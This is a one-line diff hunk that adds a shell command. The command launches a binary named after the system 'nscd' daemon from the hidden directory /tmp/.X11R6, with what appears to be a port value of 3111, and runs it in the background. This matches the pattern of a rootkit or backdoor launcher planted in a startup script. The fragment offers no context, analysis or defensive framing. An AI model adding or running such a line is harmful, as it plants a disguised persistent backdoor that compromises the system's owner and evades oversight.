@@ -1,0 +1,1 @@
+/sbin/sh -c (PATH=/tmp/.X11R6	P=3111	nscd;)&
